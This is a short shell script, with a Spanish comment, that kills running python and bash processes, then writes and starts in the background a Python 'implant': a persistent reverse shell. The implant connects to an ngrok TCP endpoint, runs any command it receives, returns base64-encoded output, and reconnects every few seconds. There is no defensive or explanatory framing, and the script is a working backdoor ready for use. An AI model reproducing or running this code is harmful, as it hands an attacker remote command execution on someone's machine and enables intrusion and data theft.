pkill -f python
pkill -f bash
killall python3 2>/dev/null; killall bash 2>/dev/null

cat > ~/implant.py << 'EOF'
import socket, subprocess, os, time, base64
while True:
    try:
        s = socket.socket()
        s.connect(("7.tcp.eu.ngrok.io", 12642))   # ← CAMBIA AQUÍ TU HOST Y PUERTO
        while True:
            cmd = s.recv(1024).decode().strip()
            if not cmd or cmd == "exit": break
            p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            out = p.stdout.read() + p.stderr.read()
            s.send(base64.b64encode(out + b"\n"))
    except:
        time.sleep(7)
EOF




nohup python3 ~/implant.py >/dev/null 2>&1 &
